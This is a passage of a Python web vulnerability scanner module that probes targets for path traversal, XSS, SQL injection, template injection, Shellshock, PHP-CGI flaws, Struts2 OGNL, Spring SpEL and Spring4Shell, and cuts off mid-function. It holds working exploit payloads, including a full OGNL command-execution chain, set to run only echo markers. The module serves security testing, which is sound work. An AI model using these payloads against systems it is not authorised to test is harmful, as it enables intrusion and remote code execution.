import re as _re
import time
import requests
from urllib.parse import quote

from .findings import Finding, Severity, probe_result, probe_error


class _InjectionTestBase:
  """Shared execution engine for injection-style web tests."""

  def _run_injection_test(self, target, port, *, params, payloads, check_fn,
                          finding_factory, max_findings=3):
    """
    Iterate params x payloads, call check_fn(response, needle) for each,
    create findings via finding_factory(param, payload, response, url).
    """
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
    findings = []

    for param in params:
      if len(findings) >= max_findings:
        break
      for payload, needle in payloads:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=3, verify=False)
          if check_fn(resp, needle):
            findings.append(finding_factory(param, payload, resp, url))
            break  # Found for this param, next param
        except Exception:
          pass

    return findings


class _WebInjectionMixin(_InjectionTestBase):
  """
  Non-destructive probes for path traversal, reflected XSS,
  and SQL injection (OWASP WSTG-INPV).
  """

  def _web_test_path_traversal(self, target, port):
    """
    Attempt path traversal via URL path and query parameters with encoding variants.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    unix_needles = ("root:x:", "root:*:", "daemon:")
    win_needles = ("[boot loader]", "[operating systems]", "[fonts]")

    # --- 1. Path-based traversal ---
    path_payloads = [
      "/../../../../etc/passwd",
      "/..%2f..%2f..%2f..%2fetc/passwd",
      "/....//....//....//....//etc/passwd",
      "/../../../../windows/win.ini",
    ]
    for payload_path in path_payloads:
      if len(findings_list) >= 3:
        break
      try:
        url = base_url.rstrip("/") + payload_path
        resp = requests.get(url, timeout=2, verify=False)
        if any(n in resp.text for n in unix_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: /etc/passwd via path",
            description=f"Server returned /etc/passwd content via path traversal.",
            evidence=f"URL: {url}, body contains passwd markers",
            remediation="Sanitize path components; use a web application firewall.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
        if any(n in resp.text for n in win_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: win.ini via path",
            description=f"Server returned Windows system file content.",
            evidence=f"URL: {url}, body contains win.ini markers",
            remediation="Sanitize path components.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter traversal ---
    params = ["file", "path", "page", "doc", "template", "include", "name"]
    payloads_qs = [
      ("../../../../etc/passwd", unix_needles),
      ("..%2f..%2f..%2f..%2fetc/passwd", unix_needles),
      ("..%252f..%252f..%252f..%252fetc/passwd", unix_needles),  # double-encoded
      ("..\\..\\..\\..\\windows\\win.ini", win_needles),
    ]
    for param in params:
      if len(findings_list) >= 3:
        break
      for payload, needles in payloads_qs:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=2, verify=False)
          if any(n in resp.text for n in needles):
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"Path traversal via ?{param}= parameter",
              description=f"Parameter '{param}' allows reading system files.",
              evidence=f"URL: {url}",
              remediation=f"Validate and sanitize the '{param}' parameter.",
              owasp_id="A01:2021",
              cwe_id="CWE-22",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  def _web_test_xss(self, target, port):
    """
    Probe reflected XSS via URL path injection and query parameters.

    Tests multiple payloads across common parameter names.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    xss_payloads = [
      ('<img src=x onerror=alert(1)>', 'onerror=alert'),
      ('<svg onload=alert(1)>', 'onload=alert'),
      ('<script>alert(1)</script>', '<script>alert(1)'),
      ('" onfocus="alert(1)" autofocus="', 'onfocus='),
    ]

    # --- 1. Path injection ---
    for payload, needle in xss_payloads:
      if findings_list:
        break
      try:
        url = base_url.rstrip("/") + f"/{payload}"
        resp = requests.get(url, timeout=3, verify=False)
        if needle in resp.text:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title=f"Reflected XSS via URL path",
            description=f"Payload '{payload[:40]}' reflected in response body.",
            evidence=f"URL: {url}, needle '{needle}' found in body",
            remediation="Encode output; implement Content-Security-Policy.",
            owasp_id="A03:2021",
            cwe_id="CWE-79",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter injection ---
    params = ["q", "search", "id", "name", "page", "input", "text"]

    def _xss_check(resp, needle):
      return needle in resp.text

    def _xss_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"Reflected XSS via ?{param}= parameter",
        description=f"Payload '{payload[:40]}' reflected unescaped via '{param}'.",
        evidence=f"URL: {url}",
        remediation=f"HTML-encode the '{param}' parameter in output.",
        owasp_id="A03:2021",
        cwe_id="CWE-79",
        confidence="certain",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=xss_payloads,
      check_fn=_xss_check,
      finding_factory=_xss_finding,
      max_findings=3 - len(findings_list),
    )

    return probe_result(findings=findings_list)


  def _web_test_sql_injection(self, target, port):
    """
    Multi-technique SQL injection probe: error-based, boolean-blind, time-based.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    sql_error_keywords = [
      "sql", "syntax", "mysql", "psql", "postgres", "sqlite", "ora-",
      "microsoft ole db", "odbc", "unclosed quotation", "unterminated",
      "you have an error in your sql",
    ]
    params = ["id", "page", "q", "user", "item", "cat"]

    # --- 1. Error-based ---
    error_payloads = [
      ("'", None),
      ("1'--", None),
      ("1 UNION SELECT NULL--", None),
      ("1' OR '1'='1", None),
    ]

    def _sqli_error_check(resp, _needle):
      body = resp.text.lower()
      return any(kw in body for kw in sql_error_keywords)

    def _sqli_error_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"SQL injection (error-based) via ?{param}=",
        description=f"SQL error keywords in response to payload '{payload}'.",
        evidence=f"URL: {url}",
        remediation=f"Use parameterized queries for '{param}'.",
        owasp_id="A03:2021",
        cwe_id="CWE-89",
        confidence="firm",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=error_payloads,
      check_fn=_sqli_error_check,
      finding_factory=_sqli_error_finding,
      max_findings=3,
    )

    # --- 2. Boolean-blind (only if error-based found nothing) ---
    if not findings_list:
      for param in params[:3]:
        if findings_list:
          break
        try:
          url_true = f"{base_url}?{param}=1 AND 1=1"
          url_false = f"{base_url}?{param}=1 AND 1=2"
          url_base = f"{base_url}?{param}=1"

          resp_base = requests.get(url_base, timeout=3, verify=False)
          resp_true = requests.get(url_true, timeout=3, verify=False)
          resp_false = requests.get(url_false, timeout=3, verify=False)

          # Baseline should match true, differ from false
          if (resp_base.status_code == resp_true.status_code and
              abs(len(resp_base.text) - len(resp_true.text)) < 50 and
              abs(len(resp_true.text) - len(resp_false.text)) > 50):
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (boolean-blind) via ?{param}=",
              description=f"Response differs between AND 1=1 and AND 1=2.",
              evidence=f"Base size={len(resp_base.text)}, true={len(resp_true.text)}, "
                       f"false={len(resp_false.text)}",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="tentative",
            ))
        except Exception:
          pass

    # --- 3. Time-based (last resort, max 2 params) ---
    if not findings_list:
      for param in params[:2]:
        if findings_list:
          break
        try:
          url_sleep = f"{base_url}?{param}=" + quote("' AND SLEEP(2)--")
          start = time.time()
          requests.get(url_sleep, timeout=5, verify=False)
          elapsed = time.time() - start
          if elapsed >= 2.0:
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (time-based) via ?{param}=",
              description=f"SLEEP(2) caused {elapsed:.1f}s delay.",
              evidence=f"URL: {url_sleep}, elapsed={elapsed:.1f}s",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="firm",
            ))
        except Exception:
          pass

    return probe_result(findings=findings_list)


  # ── SSTI (Server-Side Template Injection) ────────────────────────────

  def _web_test_ssti(self, target, port):
    """
    Probe for Server-Side Template Injection via safe math expressions.

    Tests ``{{7*7}}`` (Jinja2/Twig), ``{{7*'7'}}`` (Jinja2 string mult),
    ``${7*7}`` (Freemarker/Mako) across common parameter names and URL path.
    Detection: response contains the *evaluated* result but NOT the raw payload
    (which would indicate XSS reflection, not template evaluation).

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    ssti_payloads = [
      ("{{71*73}}", "5183", "Jinja2/Twig"),
      ("{{7*'7'}}", "7777777", "Jinja2"),
      ("${79*67}", "5293", "Freemarker/Mako"),
      ("<%= 71*73 %>", "5183", "ERB/EJS"),
    ]
    params = ["name", "q", "search", "input", "text", "template", "page", "id"]

    # Baseline: fetch the page without payloads to filter false positives
    # (e.g. "49" naturally appears in many pages)
    baseline_text = ""
    try:
      baseline_resp = requests.get(base_url, timeout=3, verify=False)
      baseline_text = baseline_resp.text
    except Exception:
      pass

    # --- 1. Query parameter injection ---
    for param in params:
      if len(findings_list) >= 2:
        break
      for payload, expected, engine in ssti_payloads:
        # Skip if expected result already exists in baseline page
        if expected in baseline_text:
          continue
        try:
          # For short expected values (e.g. "49"), bracket the payload with
          # two control requests to catch incrementing counters/timestamps
          if len(expected) <= 3:
            ctrl1 = requests.get(f"{base_url}?{param}=harmless1", timeout=3, verify=False)
          url = f"{base_url}?{param}={quote(payload)}"
          resp = requests.get(url, timeout=3, verify=False)
          if expected in resp.text and payload not in resp.text:
            if len(expected) <= 3:
              ctrl2 = requests.get(f"{base_url}?{param}=harmless2", timeout=3, verify=False)
              if expected in ctrl1.text or expected in ctrl2.text:
                continue
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"SSTI ({engine}) via ?{param}= parameter",
              description=f"Template expression '{payload}' was evaluated server-side "
                          f"to '{expected}', confirming {engine} SSTI. "
                          "This leads to Remote Code Execution.",
              evidence=f"URL: {url}, response contains '{expected}' but not raw payload",
              remediation="Never pass user input directly into template rendering. "
                          "Use sandboxed template environments.",
              owasp_id="A03:2021",
              cwe_id="CWE-1336",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    # --- 2. Path-based injection ---
    if not findings_list:
      for payload, expected, engine in ssti_payloads[:2]:
        if expected in baseline_text:
          continue
        try:
          url = base_url.rstrip("/") + "/" + quote(payload)
          resp = requests.get(url, timeout=3, verify=False)
          if expected in resp.text and payload not in resp.text:
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"SSTI ({engine}) via URL path",
              description=f"Template expression '{payload}' evaluated in URL path.",
              evidence=f"URL: {url}, response contains '{expected}'",
              remediation="Never pass user input directly into template rendering.",
              owasp_id="A03:2021",
              cwe_id="CWE-1336",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  # ── Shellshock (CVE-2014-6271) ──────────────────────────────────────

  def _web_test_shellshock(self, target, port):
    """
    Test for CVE-2014-6271 (Shellshock) by sending bash function definitions
    in HTTP headers to potential CGI endpoints.

    Safe detection: uses echo-based payload that produces a unique marker
    in the response body if bash evaluates the injected function.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    marker = "REDMESH_SHELLSHOCK_DETECT"
    shellshock_payload = f'() {{ :; }}; echo; echo {marker}'

    cgi_paths = [
      "/cgi-bin/test.cgi",
      "/cgi-bin/status",
      "/cgi-bin/test",
      "/cgi-bin/test-cgi",
      "/cgi-bin/printenv",
      "/cgi-bin/env.cgi",
      "/cgi-bin/",
      "/victim.cgi",
      "/safe.cgi",
    ]

    for cgi_path in cgi_paths:
      if findings_list:
        break
      url = base_url.rstrip("/") + cgi_path
      try:
        resp = requests.get(
          url,
          headers={
            "User-Agent": shellshock_payload,
            "Referer": shellshock_payload,
          },
          timeout=4,
          verify=False,
        )
        if marker in resp.text:
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"CVE-2014-6271: Shellshock RCE via {cgi_path}",
            description="Bash function injection via HTTP headers is evaluated "
                        "by the CGI handler, enabling unauthenticated Remote "
                        "Code Execution.",
            evidence=f"GET {url} with shellshock payload in User-Agent "
                     f"returned marker '{marker}' in response body.",
            remediation="Upgrade bash to a patched version (>= 4.3 patch 25); "
                        "remove unnecessary CGI scripts.",
            owasp_id="A06:2021",
            cwe_id="CWE-78",
            confidence="certain",
          ))
      except Exception:
        pass

    return probe_result(findings=findings_list)


  # ── PHP CGI argument injection + backdoor ───────────────────────────

  def _web_test_php_cgi(self, target, port):
    """
    Test for PHP-CGI vulnerabilities:

    1. PHP 8.1.0-dev supply-chain backdoor (zerodium ``User-Agentt`` header).
    2. CVE-2024-4577: argument injection via soft-hyphen (``%AD``) bypass.
    3. PHP-CGI source disclosure via ``-s`` flag injection.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    # --- 1. PHP 8.1.0-dev backdoor (User-Agentt header) ---
    try:
      resp = requests.get(
        base_url,
        headers={"User-Agentt": "zerodiumsystem('echo REDMESH_PHP_BACKDOOR');"},
        timeout=3,
        verify=False,
      )
      if "REDMESH_PHP_BACKDOOR" in resp.text:
        findings_list.append(Finding(
          severity=Severity.CRITICAL,
          title="PHP 8.1.0-dev backdoor: zerodiumsystem RCE",
          description="The PHP binary contains a supply-chain backdoor that "
                      "executes arbitrary code from the 'User-Agentt' (double-t) header. "
                      "This enables unauthenticated Remote Code Execution.",
          evidence=f"GET {base_url} with User-Agentt: zerodiumsystem(echo ...) "
                   "returned the echoed marker in response body.",
          remediation="Replace the PHP binary immediately — this is a "
                      "compromised build. Use an official PHP release.",
          owasp_id="A08:2021",
          cwe_id="CWE-506",
          confidence="certain",
        ))
    except Exception:
      pass

    # --- 2. CVE-2024-4577: PHP-CGI argument injection ---
    php_cgi_paths = ["/", "/index.php"]
    for path in php_cgi_paths:
      if any("CVE-2024-4577" in f.title for f in findings_list):
        break
      try:
        test_url = (
          base_url.rstrip("/") + path +
          "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        )
        resp = requests.post(
          test_url,
          data="<?php echo 'REDMESH_PHPCGI_TEST'; ?>",
          headers={"Content-Type": "application/x-www-form-urlencoded"},
          timeout=3,
          verify=False,
        )
        # Guard: auto_prepend_file output appears at the very start of the
        # response when truly executed.  Debug/error pages (e.g. Laravel
        # Ignition) may *reflect* the POST body deep in HTML, causing FP.
        if "REDMESH_PHPCGI_TEST" in resp.text[:500]:
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title="CVE-2024-4577: PHP-CGI argument injection RCE",
            description="PHP-CGI accepts soft-hyphen (%AD) as argument separator, "
                        "allowing injection of -d flags to override configuration "
                        "and execute arbitrary PHP code.",
            evidence=f"POST {test_url} with PHP echo payload was executed.",
            remediation="Upgrade PHP; migrate from CGI to PHP-FPM; "
                        "add URL rewrite rules to block %AD sequences.",
            owasp_id="A06:2021",
            cwe_id="CWE-78",
            confidence="certain",
          ))
      except Exception:
        pass

    # --- 3. PHP-CGI source disclosure via -s flag ---
    if not findings_list:
      try:
        resp = requests.get(base_url + "/?%ADs", timeout=3, verify=False)
        if "<code>" in resp.text and "<?php" in resp.text:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title="CVE-2024-4577: PHP-CGI source code disclosure",
            description="PHP-CGI -s flag can be injected via %AD soft-hyphen, "
                        "exposing PHP source code.",
            evidence=f"GET {base_url}/?%ADs returned PHP source code.",
            remediation="Upgrade PHP; use PHP-FPM instead of CGI.",
            owasp_id="A06:2021",
            cwe_id="CWE-200",
            confidence="certain",
          ))
      except Exception:
        pass

    return probe_result(findings=findings_list)


  # ── OGNL Injection (Struts2) ─────────────────────────────────────────

  def _web_test_ognl_injection(self, target, port):
    """
    Test for Apache Struts2 OGNL injection via Content-Type header (S2-045)
    and other known Struts2 attack vectors.

    Safe detection: uses math expression that produces a unique marker
    without side effects.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    # S2-045: OGNL injection via Content-Type header
    # The payload evaluates a math expression; if Struts2 processes it,
    # the error message will contain the evaluated result
    marker = "167837218"  # 12969 * 12942
    ognl_payload = (
      "%{(#_='multipart/form-data')."
      "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
      "(#_memberAccess?(#_memberAccess=#dm):"
      "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
      "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
      "(#ognlUtil.getExcludedPackageNames().clear())."
      "(#ognlUtil.getExcludedClasses().clear())."
      "(#context.setMemberAccess(#dm))))."
      "(#cmd='echo " + marker + "')."
      "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
      "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
      "(#p=new java.lang.ProcessBuilder(#cmds))."
      "(#p.redirectErrorStream(true)).(#process=#p.start())."
      "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
      "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
      "(#ros.flush())}"
    )

    # Try against common Struts2 action paths
    struts_paths = ["/", "/index.action", "/login.action", "/showcase.action",
                    "/orders/3", "/orders"]
    for path in struts_paths:
      if findings_list:
        break
      try:
        url = base_url.rstrip("/") + path
        resp = requests.get(
          url,
          headers={"Content-Type": ognl_payload},
          timeout=5,
          verify=False,
        )
        if marker in resp.text:
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"CVE-2017-5638: Struts2 S2-045 OGNL injection RCE via {path}",
            description="Apache Struts2 evaluates OGNL expressions injected via "
                        "the Content-Type header, enabling unauthenticated RCE.",
            evidence=f"GET {url} with OGNL payload in Content-Type "
                     f"returned marker '{marker}' in response body.",
            remediation="Upgrade Struts2 to >= 2.5.10.1 or >= 2.3.32.",
            owasp_id="A03:2021",
            cwe_id="CWE-94",
            confidence="certain",
          ))
      except Exception:
        pass

    # S2-045 alternative: check if Struts returns OGNL error in response
    # (indicates vulnerable parser even if execution is sandboxed)
    if not findings_list:
      for path in struts_paths[:3]:
        try:
          url = base_url.rstrip("/") + path
          resp = requests.get(
            url,
            headers={"Content-Type": "%{1+1}"},
            timeout=4,
            verify=False,
          )
          if resp.status_code == 200 and "ognl" in resp.text.lower():
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"Struts2 OGNL parsing detected via {path}",
              description="Struts2 attempted to parse OGNL expression in "
                          "Content-Type header. May be exploitable for RCE.",
              evidence=f"GET {url} with Content-Type: %{{1+1}} "
                       "returned OGNL-related content.",
              remediation="Upgrade Struts2; apply S2-045 patch.",
              owasp_id="A03:2021",
              cwe_id="CWE-94",
              confidence="firm",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  # ── Java Deserialization endpoints ─────────────────────────────────

  def _web_test_java_deserialization(self, target, port):
    """
    Detect exposed Java deserialization endpoints:
    - WebLogic wls-wsat / iiop_wsat
    - JBoss /invoker/readonly
    - JBoss /jmx-console/
    - Spring Boot /jolokia

    Does NOT send actual deserialization payloads — only probes for
    endpoint existence (safe detection).

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    deser_endpoints = [
      {
        "path": "/wls-wsat/CoordinatorPortType",
        "product": "WebLogic",
        "cve": "CVE-2017-10271",
        "check": lambda resp: resp.status_code == 200 and ("CoordinatorPortType" in resp.text or "xml" in resp.headers.get("Content-Type", "").lower()),
        "desc": "WebLogic wls-wsat endpoint exposed — attack surface for "
                "XMLDecoder deserialization RCE (CVE-2017-10271).",
      },
      {
        "path": "/_async/AsyncResponseService",
        "product": "WebLogic",
        "cve": "CVE-2019-2725",
        "check": lambda resp: resp.status_code in (200, 500) and ("AsyncResponseService" in resp.text or "xml" in resp.headers.get("Content-Type", "").lower()),
        "desc": "WebLogic _async endpoint exposed — attack surface for "
                "deserialization RCE (CVE-2019-2725).",
      },
      {
        "path": "/invoker/readonly",
        "product": "JBoss",
        "cve": "CVE-2017-12149",
        "check": lambda resp: resp.status_code == 500,
        "desc": "JBoss /invoker/readonly returns 500, indicating the "
                "deserialization endpoint exists (CVE-2017-12149).",
      },
      {
        "path": "/invoker/JMXInvokerServlet",
        "product": "JBoss",
        "cve": None,
        "check": lambda resp: resp.status_code in (200, 500),
        "desc": "JBoss JMXInvokerServlet exposed — Java deserialization attack surface.",
      },
    ]

    for ep in deser_endpoints:
      try:
        url = base_url.rstrip("/") + ep["path"]
        resp = requests.get(url, timeout=4, verify=False)
        if ep["check"](resp):
          title = f"Java deserialization endpoint: {ep['path']}"
          if ep["cve"]:
            title = f"{ep['cve']}: {ep['product']} deserialization endpoint {ep['path']}"
          findings_list.append(Finding(
            severity=Severity.CRITICAL if ep["cve"] else Severity.HIGH,
            title=title,
            description=ep["desc"],
            evidence=f"GET {url} → {resp.status_code}",
            remediation=f"Remove or restrict access to {ep['path']}; "
                        f"upgrade {ep['product']}.",
            owasp_id="A08:2021",
            cwe_id="CWE-502",
            confidence="firm",
          ))
      except Exception:
        pass

    return probe_result(findings=findings_list)


  # ── Spring Actuator & SpEL injection ───────────────────────────────

  def _web_test_spring_actuator(self, target, port):
    """
    Detect Spring Boot Actuator exposure and Spring Cloud Function SpEL injection.

    Tests:
    1. Actuator endpoints (/actuator, /actuator/env, /actuator/health, /env)
    2. Spring Cloud Function CVE-2022-22963 (SpEL via spring.cloud.function.routing-expression)

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    # --- 1. Actuator endpoints ---
    actuator_paths = [
      ("/actuator", "Actuator root — lists available endpoints"),
      ("/actuator/env", "Environment dump — may contain secrets"),
      ("/actuator/health", "Health check — reveals internal state"),
      ("/actuator/beans", "Bean listing — reveals application structure"),
      ("/actuator/configprops", "Configuration properties — may contain secrets"),
      ("/actuator/mappings", "URL mappings — reveals all API endpoints"),
      ("/env", "Legacy Spring Boot environment endpoint"),
      ("/jolokia", "Jolokia JMX-over-HTTP — RCE risk via MBean manipulation"),
    ]

    for path, desc in actuator_paths:
      try:
        url = base_url.rstrip("/") + path
        resp = requests.get(url, timeout=3, verify=False)
        if resp.status_code == 200:
          # Validate it's actually an actuator/Spring endpoint
          ct = resp.headers.get("Content-Type", "").lower()
          body = resp.text[:2000]
          if "json" in ct or "actuator" in body.lower() or "{" in body[:10]:
            sev = Severity.HIGH
            if path in ("/actuator/health",):
              sev = Severity.MEDIUM
            if "jolokia" in path:
              sev = Severity.CRITICAL
            findings_list.append(Finding(
              severity=sev,
              title=f"Spring Actuator exposed: {path}",
              description=desc,
              evidence=f"GET {url} → {resp.status_code}, Content-Type: {ct}",
              remediation="Restrict actuator endpoints via security config; "
                          "disable sensitive endpoints in production.",
              owasp_id="A05:2021",
              cwe_id="CWE-215",
              confidence="certain",
            ))
      except Exception:
        pass

    # --- 2. CVE-2022-22963: Spring Cloud Function SpEL injection ---
    marker = "REDMESH_SPEL_9183"
    try:
      # First, check if /functionRouter exists at all (baseline without SpEL header)
      baseline_resp = requests.post(
        base_url + "/functionRouter",
        data="test",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=5,
        verify=False,
      )
      # Now send with SpEL header
      resp = requests.post(
        base_url + "/functionRouter",
        data="test",
        headers={
          "Content-Type": "application/x-www-form-urlencoded",
          "spring.cloud.function.routing-expression":
            f'T(java.lang.Runtime).getRuntime().exec("echo {marker}")',
        },
        timeout=5,
        verify=False,
      )
      spel_detected = False
      confidence = "firm"
      evidence_detail = ""
      # Check 1: explicit SpEL error in response
      if resp.status_code == 500 and ("SpelEvaluationException" in resp.text or
                                       "EvaluationException" in resp.text or
                                       "routing-expression" in resp.text):
        spel_detected = True
        evidence_detail = "SpEL error in response body"
      # Check 2: marker in response (actual execution)
      elif resp.status_code == 500 and marker in resp.text:
        spel_detected = True
        confidence = "certain"
        evidence_detail = f"marker '{marker}' in response"
      # Check 3: /functionRouter returns 500 with SpEL header but different
      # status without it — indicates the header was processed
      elif (resp.status_code == 500 and
            baseline_resp.status_code != 500 and
            baseline_resp.status_code in (200, 404)):
        spel_detected = True
        evidence_detail = (f"500 with SpEL header vs {baseline_resp.status_code} "
                           "without — header was processed")
      # Check 4: both return 500 but the endpoint exists (not a generic 404)
      elif (resp.status_code == 500 and baseline_resp.status_code == 500):
        # Both fail, but endpoint exists — likely Spring Cloud Function
        # with routing that crashes on the SpEL expression
        spel_detected = True
        confidence = "tentative"
        evidence_detail = "both requests return 500 — endpoint exists and processes routing"

      if spel_detected:
        findings_list.append(Finding(
          severity=Severity.CRITICAL,
          title="CVE-2022-22963: Spring Cloud Function SpEL injection RCE",
          description="Spring Cloud Function evaluates SpEL expressions from the "
                      "spring.cloud.function.routing-expression header, enabling RCE.",
          evidence=f"POST {base_url}/functionRouter with SpEL header → "
                   f"{resp.status_code}. {evidence_detail}",
          remediation="Upgrade Spring Cloud Function to >= 3.1.7 or >= 3.2.3.",
          owasp_id="A03:2021",
          cwe_id="CWE-94",
          confidence=confidence,
        ))
    except Exception:
      pass

    # --- 3. Spring4Shell indicator: check if class.module access is possible ---
    # Safe detection: send parameter that would trigger Spring4Shell but
    # only look for error patterns, not actual exploitation.
    # Control-parameter comparison prevents false positives on servers
    # with catch-all handlers (Struts2/Jetty, plain Tomcat, JBoss) that
    # return 200 for any unknown parameter.
    try:
      # Control: send a bogus class path that no framework would bind
      resp_control = requests.get(
        base_url + "/?class.INVALID_RM_CTRL.x=1",
        timeout=3,
        verify=False,
      )
      resp_cl = requests.get(
        base_url + "/?class.module.classLoader.DefaultAssertionStatus=true",
        timeout=3,
        verify=False,
      )
      # If both return 200 with similar body length, server MAY ignore params.
      # Use URLs[0] as secondary differentiator: Spring will 400/500 on URLs[0]=0
      # while a catch-all server returns 200 unchanged.
      if (resp_control.status_code == 200 and resp_cl.status_code == 200 and
          abs(len(resp_control.text) - len(resp_cl.text)) < 50):
        # Secondary check: URLs[0] differentiates Spring from catch-all servers
        resp_urls = requests.get(
          base_url + "/?class.module.classLoader.URLs%5B0%5D=0",
          timeout=3,
          verify=False,
        )
        resp_urls_ctrl = requests.get(
          base_url + "/?class.INVALID_RM_CTRL.URLs%5B0%5D=0",
          timeout=3,
          verify=False,
        )
        if (resp_urls.status_code in (400, 500) and
            resp_urls_ctrl.status_code == 200):
          # Spring tried to bind classLoader.URLs[0] and got a type error,
          # while the control was ignored — confirms Spring binding
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title="Spring4Shell (CVE-2022-22965) parameter binding indicator",
            description="Spring MVC processes class.module.classLoader parameter "
                        "binding (type error on URLs[0] vs ignored control), "
                        "confirming Spring4Shell attack surface.",
            evidence=f"classLoader.URLs[0]=0 → {resp_urls.status_code}, "
                     f"control.URLs[0]=0 → {resp_urls_ctrl.status_code}.",
            remediation="Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20.",
            owasp_id="A03:2021",
            cwe_id="CWE-94",
            confidence="firm",
          ))
      elif resp_cl.status_code == 200:
        # Only classLoader accepted (or significantly different response) —
        # proceed with URLs[0] check
        resp2 = requests.get(
          base_url + "/?class.module.classLoader.URLs%5B0%5D=0",
          timeout=3,
          verify=False,
        )
        if resp2.status_code == 200:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title="Spring4Shell (CVE-2022-22965) parameter binding indicator",
            description="Spring MVC accepts class.module.classLoader parameter "
                        "binding, which is the attack surface for Spring4Shell RCE.",
            evidence=f"GET with class.module.classLoader parameter → 200, "
                     f"URLs[0] → {resp2.status_code}.",
            remediation="Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20.",
            owasp_id="A03:2021",
            cwe_id="CWE-94",
            confidence="tentative",
          ))
        elif resp2.status_code in (400, 500):
          # 400/500 = Spring tried to bind classLoader but failed on type
          # conversion — stronger evidence than silent acceptance
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title="Spring4Shell (CVE-2022-22965) parameter binding indicator",
            description="Spring MVC processes class.module.classLoader parameter "
                        "binding (type error on URLs[0]), confirming Spring4Shell "
                        "attack surface.",
            evidence=f"GET with class.module.classLoader → 200, "
                     f"URLs[0] → {resp2.status_code} (binding attempted).",
            remediation="Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20.",
